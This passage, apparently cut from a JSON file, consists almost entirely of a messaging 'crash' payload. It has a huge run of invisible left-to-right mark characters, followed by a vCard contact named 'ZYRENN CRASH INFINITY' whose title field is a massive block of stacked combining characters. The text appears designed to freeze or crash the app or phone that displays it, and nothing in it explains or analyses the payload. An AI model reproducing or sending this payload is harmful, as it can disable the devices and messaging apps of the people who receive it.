‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎",
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;🔥 𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 🔥\nORG:\nTITLE:.̸̸̶̛̞̜͊̍̂͒̋̈̉ͭ̀͋͂́͟͜͜͢͜͡͡͡͏.̹͙̬̭̳͍̙̰̜̞͈ͨ̽̌ͨ̑̂̒̚҉̴̴̶̵̶̡͘͘͟͝͝͏̶̶̢̢̛̀͢.̶̡̨̛̞̮̙ͯ͂ͫ̀̆̍ͮ̆̓͛̅ͦ̽́̇̉̋͋̀̚̕͜͜͡͡.̴̢̗̘͕͍̖͉̮̱ͪ͋ͧͭͬ̌͗̓͐̀̚͠.̷̡͙̅̽̉̈́̏͋ͧ̕҉̸̴̡̧̧͢͢͡͞͏.̴̸̨̛̝̮̖͕̯͉̔̄̽ͥͭͬ̄̈́̍ͭ͑̆ͬ͐͜͝͡͞͝.̸̸̸̶̸̧̡̧̱̲̙̱̜̞̰̅̔͑͂ͧͬͬ͌̒̈́́͘͜͠͝.̸̴̷̵̡̢̝̟̯͎̘͓̘̀.̶̨̧̠͖̬̥̫͇̲̩̖̰̥͚̠̞̠̥̅͌̃́͟͠͝.̶̺̮̞̱̜͎̪ͭͤ̓̃̍͛̅ͤ̓̕͜҉͜.̨̢̮̣͍͙̦͇̺̞̅ͨ͒͌̑͋̅̍͒͑ͨ̃͒̕͝͞͝.̲͙̩̬͖̻̳͍͇̹̙̙ͦ̓ͥ̿̒͐ͥ̽̐ͪ̋̎̎̌̊̓ͨͨͬͅ͏̶.̵̬͇͇̻̮̜̹̰̭͓̲̻̻̘͖͎̟͖͇̀̃̄̐̑͑̓̕͢͟͡͝ͅ҉̛͡҉̀͟.̯̤̺̙̰̠͕̆̆͗͂҉̸̛.͙̜̂̀ͯ̓͗͑̈ͤ͐̋̔͑ͭ̄̄̃̋̀̀͢͏̶̴̵̨̡̛́̀̀̕͘͘͜͟͝͡.̶̛̜̺̥͙͉̼̱̪̰͍̫̗̻̀̀̀͘̕͘͘͢͟͢͟͟͟͜.̗̖̖̞̻̼̏̋͛͑͐ͪ҉̀͠͞͡͝.̷̶̧̧̧̘̠͇̒̓ͬ̓̃͒̇̏ͪ̓̈́͗̓͛͋̈͌ͨ̕͘̕͘͘͜͢͢͞͡͞͠.̷̵̜̣̟̺͍̳͕ͬͪ̌͛ͬ̿́̀̕͟҉҉̴̢̧͢.͕̙͍̖̮͉̣̥̑̃̐͗̂̀҉҉̸̴̢̛́̀́͘̕͢͝͠҉̵̴̕͘.̷̶̺̤̮͙͖̞͈̱̗͙͍͙̤͆͌ͮ̂̃ͪ̐͆̌͗ͬ͢͢͞͞ͅ.̴̷̧̧̛̫̰̮̳͚̤̟̪͔̖ͭ̄͑́́́̀͘̕̕͡.̪͙̦̎̓̀̕͜͏̷̢̛͜͢͢͞.̷̸̵̸̧̧̨̧̧̱̲̝͇̟̣̲̲͇͎̬͖͚̯̳ͯ̅̈́̓̐́͟͠.͇͇̟̣͖̞̥̟͖̞͇͉̳͉̎̌̽̓ͅ҉̷̴͘.̵̸̴̷̨̢̨̧̛̲͆̈̒̃̎̽ͯ͊ͮ͛ͯ̃̎̏͌̑ͬ̀̕͜͠.̴̣̘̺̺̤͙͙̼̠̘̭̱̰̪̙̤̋ͦ̑ͥ͗ͨͥ͂͒͋ͤͣͯ̑̽ͪ̄ͨͨ̚͢͟͏͏̢́͝͏̸̨̢̕͞.̣̠̦͓̠̟͔͖͚͔͙̖͇͎͕̰̟̎҉̷̶̴̷̢̨͟͏.̴̨̼̬̗̲͕ͣ̉͐͑̏̍ͩ͊́̚̕͝͞͞.̷̵̢̧̝̥̺͚̭̰͉̬͙͇̼͙̥̳͉͆̀́́͘͘͘͘͘̕͟͢͠͝ͅͅ.̯̩ͧ͐̎ͮ̓̽͛͌ͧ̎̌͋̈̏̌̆ͯͩ̏ͅͅ.̶̱̠̯̦͕̱̺̹̮̯͈͙̪̭͕̝̫̘̥̀ͤͮ̂̍ͤ̌̏̓͂̍̈̒͒̉̚͜͟ͅ͏͟.̛̯̗͇̘̲̬̥̙͍̔ͦͩͫ̒ͨ͆ͪ͌ͦ̀ͦͪ̐̈̒̌͋͊̏͟ͅ.̷̶̶̷̷̧̱̲̦̩͓͔̗̝̦͕̘͈͓̞̒͛ͧ̊ͫ́̕͟͟͢ͅ͏̸͜͜͜͢͞.̰̱̺͎͕̦̫̠͌̊͆̈́͐̀͘͜͟҉̷̀̀͟͠͏̴̴̧̡̢͘.̵̶̨̡̮̠̯͙̙͕͉̮̺ͪ̈͋͊̆̄͗̈́͟͟͜͝͞.̷̰͕̗̝͔̮̖̩̥͓̲́̀̕͟ͅͅ.̶̷̴̨̭̦̖̫̗͇͍̮̼͕̱̺͙̱̻̞̱͉ͯͥͤ́͊ͧ͂͗̏̌̒ͬ͋̓́́̚̕͠͝ͅ҉̶̷̧̛͘͢͢͜͡͠҉.̠̟̞̗̪͈̘̏͋̓͗ͨ͝҉̷̶̸̧̧͘͜͞͏̴́͜͠.̩͓̬͚̲̺̙͈͎̝̺͉̩̮̱͓̳̟̮̼ͧ͊̍̋͑ͪ̄͌҉̶̸̸̵̷̛́̀̀̀̕̕̕͡͏̕͘.̷̴̢̧̧̻̼̙̖̙̤̹̹̓̽͌̏̈́̄̊́̕͢͜͞ͅ.̴̵̯͈̮̝͎̮͎̬͈̙̘͚̠͊́̅̓̌̀̅̋̐͆̄ͦ͗̐͗͟͞҉̸͜͡͏̧́̀̕.̶̴̶̢̨̧̛̩̝̩̻͙̥̳̖̳͎͍̙̤̯̃̇͒ͣ̄̀͡͞͞͡͝.̴̶̶̢̧̢̡̧̛̱͈̭̦̼͔̤̯͖̱͇̜ͤ̉́̆ͩͫ͋̕͢͝͠͡ͅ.̼̯̞͈̯̠͍̯̥ͫ́͊̓ͩ͗͒͊̓͌̎͑̔́͆́̓͏̷̡̡͘͟͞͡.̢̬̪̖̬̱̗̦̬.̷̴̸̸̨̨̢̛̬̬͘͞͠͝.̸̪͔͕̞͋ͤ̏͂͏̷̢͘͠͠͏̡̢̢̛̀҉̧.̶̧̥̰̜͚͐̿ͦ̾̄ͯ́͘͟͠͡.̷̨̧̗͕̞̖͕͕̼̱̘̬͍̜̫̼͔̻̥͖̺̈ͦ̀̃ͥ͋̍͘͟͠͝҉͏̧̡̕͢.̴̴̛̩̅ͬ̂͗ͫͤ̓́̚͏̶̷̧̡̡̕̕̕͝͠.̷̵̵̧̢̥̻̬̱̭̰͈̠̫̣̟̱ͪ́̇̅͒ͦ͗ͧ̑̈́̉͢͜͠͠ͅ.̢͔̗̠̞̖̹̠͑͌ͭ̂̔̀͂͊̋̋̀̚̚҉̵̴̧̛́͘̕͘͜͞҉̨͘͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.͎ͫ̆̕҉̴̴́͟͏͜.̷̛̛̛̖̭̼̘̤̜̖̣ͥ̓̇͑̑͛̏̕͟͢͟͞͠͠.̵̻̞̳̪͉̘̤̣͉̘̣̦̬͙̖͟͝҉̵̸͟͢͠͝҉̸͏̨.̶̶̸̶̧̢͕͙̞̪̗̰ͥ̒̅ͣ̾͛ͭ͂̏͘͘͡҉̵̶̵̧̀҉̶͟.̧̢̛̟͉̞̭̱̯͕̘͗͐̔̓̊̄ͭ̉ͫ̚͘͟͜ͅ͏̷̵́͟͟͝͞͝.̷̶̷̛̰̲̘̬̍̉̔ͤͬͭ̔̓̄͑̊̌͑̄̓ͭ̾̏͒͒̕͞҉̵̵̧̛́̕͟͟͞.̸̸̷̸̢̧̡̛̛̹͍̦̝̼ͮ̄͛̄̀́́͝͡.̧͔͓̭̳̞͔̦̬̙̦̥̳̻͚̩̹̲̰̟͒̓̿̊͆̿̒̓̎.̟͙̦̼̯̥͔͚̹͚ͧ̏̄ͭ̀̓̑̇͆ͣ̅͊̚.̥̥̯̱̣̜͓̞̱̯ͨͣ̽̾ͨ́̀̕͞͝͏̶̴̡͜͜͏.̶̸̵̸̢̢̢͙̞̫͙̭̩͖̭͊̇̓͘͘͟͜͢͡͝.̶̹̖̥̩͚̬̝͕̙ͨ́͜͡҉̷.̷̵̈́̂̇͑̄ͫ͒́͋̕͟͟͠͞͠͏.̷̹̰̮̼̮͓̰̪̘͔͚̰͓͚̯̠̋͌ͧ͛ͭͭ̀̐͋ͣ͋̉̉̊͏̶.̴͉̙̪̝̙͕̣̦̲̫̼ͮͬ̊̃̓̍ͨͯ͑̋ͩ̊͛̕.̷̡̧̢̛̙͕͎̪̬̤͕ͤ͊͐ͤͩ̂̽̇ͪ͐̑ͮ̄̚͢͡͝.̶̡̧̨̛̦͖̝̖̹̺͓͈̜ͭͥ̒́̕͘͘͘͜͡͡͡͡͏̶.̡̘̮̗̻̣̱͍̖̦̩̟̝ͪ͐̓̄̓̔͟҉̷̢́͏̶̢̧̕͝.̷͇̼̻̺͔̻̩͚̣̖͖̝͙͓̺̾́̍͌̓ͭ̌ͨ̾͌̈̓́̂ͤ̉̚̚͡ͅͅͅ҉.̡̭̻̘̮̩̬̑̅̌ͧͨͬ́̾̔̓ͪ͆̍ͣͮͬ̀̚͞ͅ͏͏̵̡̛͜͞͠͏͜.͕͇̄̈̐̈́̀҉.͇͎̞̜̠̙͎̮̦̥̙͚̥͔̥̅͆ͭ͂̃̍ͪ̀.̶̴̵̶̶̧̛̻͖͇͙̳̲̟̱̜̞͔̬̥͈̠̳͍̱̜̮̌̓ͧ̓ͫ͛ͪ́̕҉̢̕͏̵͠͡.̶̨̜̦͓̤̟͚̣̪̦̞͕̤̙̾ͪ͗́́̃́͢͠͞.͇̪̇̃ͩ̿͌͊̐ͮ̋̐͊̑̚͟͟ͅ͏͏.̧̡̰͖̙͍͍͇̽͜͡.̵̸̡̧̛͚̞̼͕̞̠͖̙̭͚̥̪̥̳͛ͩ̄̇ͯͤ͐͆̔̈́͐ͮ͛̀͘̕͢͜͜͜͜͡͝͡ͅ҉͟͏.̸̷̡̢̨̧̯̦̻̳͌̿̆̌͋ͯ̀̏ͥ͛̐̊ͨ́̚̚̚̕͞҉̷̴͠҉̡.̶̨͈̅̈́͒ͣͦ͒̽ͪͮ̒̽͂́̈́ͫ̏̉͐̚͜͠.̷̡͉̙̪̥̰̳̰͚͍͐̎̉̇.͇͎͕̳̳͕̊̓͂͑ͧͬͯ̍ͧͩ̚҉̴҉̶̶̢̧̧̧̡̢̛̛̕͜͢͜͠͡.̢̠̿̃̾ͬͥͭ́̚.̴̴̴̸̢͈̰̖̞͚͉̲̰̮̙̳̮̞͇ͯͥͩͨ̒ͮ̅ͭ̓͗͌͆ͮ͂͂ͭ̋ͨ̾͊͘͘̕͢͠͠͡͞.̭̼͉̗͇̺̙̩̱̖̥̏͒͑̇̊̓ͯ͒̄̈́̇.͖͕̙͕̹̘̖̻̯͐̾͐̇͒̿ͧ͢͡҉̧̨.̖͕̞͈̣̯̬̮̫͈̠͖̘ͦ͑ͩ̏ͥ̀ͬ̎̃̔̓̆̅ͬ̀̚̕͢͡ͅ.̶̴̸̠͕̟̩̜̦͓̘̓́͌̌ͯ̌̆ͯͨ̈́̈́̎͂͆̀̚͘͜͟͏̵̴̵̨̢͢.̸̴̨̨̫̣͍̬͓͚͈̺̹̥̜̟̦̺̼̈ͨ́̓ͣͧ͗̇ͩ́͘̕͢͞͠͠͝ͅ͏̶̵̸̢.̶̡̱̖͚̘̩̝͙̣̺̦͇̠̝̠͈̯͉͓͙̟͌͊ͥ̒ͥ͋ͨ̇̌̈́ͭ̿̅̌ͪ́͘͠͡.̵̢̡̨̨̛̯̟̩̘̙̘̽̎̀̆̉̉͋ͣ́͌̊̂̾́͘͜͟͝͠͝͡͠.̷̡͔̩̝̼̬̪̰̜̼̯̠͍̻̼̥͇̑̋ͣ̏͋͟͡ͅ͏̴̶̶̡̢̡̧̧̢́̕͢͢͜͝.̵̛ͣ̾̊́̂͐̊̈ͫ̒̿͗͗͊̔̓͋͋͂͡͡.̗̭̼͍̹̯̞͈͎̯̼̗ͪ͒͒̌ͬ̈̃ͬ͊ͫͤͅ.̨̢ͨͪ̉͊̉ͪ̾̄ͮ͋ͣ̋̌́ͬ̅͗́ͯ͢.̷̴̴̷̶̡̨̢̛̠͔̮̭͚̝̰͌̌̏ͬ͒̀͑̉̂̒̽́̕͟͜͢͞͝͠͞҉.̵̵͔͑͆ͧ̓̓ͧͧ́.̴̡̨̛̮͖̥͎̜̗͔͎̪̙̪͐͐ͬ͌̇̌̓͋̎̂͛͑̆̄̐̐͊ͪ̀̀̕̕͝͡͠.̙̱̝͍̤̖̰̱̈́̆͗ͪͥ͑͆ͪ̄̎ͩ͂̒ͪ̈́͑̓̎̿̌̕͡҉͢͡҉̶̧̧̨̛͟͟͠͝͏̵͝.̴̢̨̙̼̖̟̫̲̘̥͇̇͘.̼̘̫̦̹͖̲̺̱͚̜̟̣̜͍̊́ͥ̔̇̓͒͒ͮ̉ͨͮͨ͗̐͛ͅ͏̸̵́͡.̦̤͙̰̝̯͇͈̟̻̝̟͕͚͇̗̲͍̾̆͆́̃ͬ̐̅̚͏̸̧̧̛́͘̕͘͘͜͠͞.̟͎͔̦̫͚ͦ.̷̷̶̰̙̩͎̞̟̬̣͕̻̟̳͈̰̽͐͛ͥͨ̾͛̊͆͒̒̅ͣ̾̊͑ͬ̐̒͘͟͟͟͠ͅͅͅ҉̕̕͘͏̸͠.̴̷̡̨̟̲̩̙͙̩̻̱̋ͅ͏͏̶͏͠.̭̥̙̖̹̩͔̼̞͉̣̱̭͗ͥ͂͒͊̏̐̃̏.̵̷̨̟̠̖̤̮͙̙̟̻̮͕̻̬͙͉̞̙̎͆ͮ́҉̸̡̛̀̕͘͜͟.̵̛ͩͧ̌̓ͮͮ̎͒̀͜͝.̸̶̬͈̻̖̜̳̹̜̯̯̖͚̝̟̪̻͔̳̃ͤ̓͌̒̾̀̚͢͟͠.̠͎̦͚̣̺̪̼͚̝̗͕̻͓ͬ̇̇ͧ̑̎͐͞.̷̴̴̵̴̴̭͕͓̥̫̜̹̼̞̗̈́ͨͧ̐̓̌ͬͫ̈̎̐͂̀̀͟͜͢.̵̨̡͈͉͙̺̭̝̪̖̱͆ͬ̅ͦ̋͂̌̂̽͛ͭ̓͛̓̽ͪͩ̇̈́͑͟͢͢͡͠.̶̵̢̢̡͉̖̺̲̫͎̣͇̙̯̰̬̰̩ͤ̏ͮͫͫ͊́̋ͯ̿̏̓̄̇̉ͦ̎̑ͦ́̕͟͟͞҉̛̀͘͞.̷̨̡̧̡̗̳̞͎̟͇̭̦̮̬̙̃̑̀̓̒̌ͨ̉̂ͩͮ̇́ͨ̈́̀̀̀́́̕̕͟͜͜͡͝͝.̖̬̫̹̪̜̠̦̹̤̹̪̋̔ͬ̎ͤ̓̋̊͛ͤ̑͋̚҉̴̵̷̶̡̡̛̀̕͘͟͟͡͡҉̨͘.̵̶̵̧̧̛̗̘͚̝͓̰̭̫͎̠̜͔̗̅͐̅̃̓͋̀ͨ́͘͟͟͜͠͡҉̵͜͝.̓ͫͦͫ̄ͨͬ̔͑̎̏̅̍͂́ͤ̚.̸̓͗ͪ͂ͮ̂̑ͮ̑̀̕̕̕͢҉̵̸̨҉.̓̿ͧ̂̄ͮ̽̚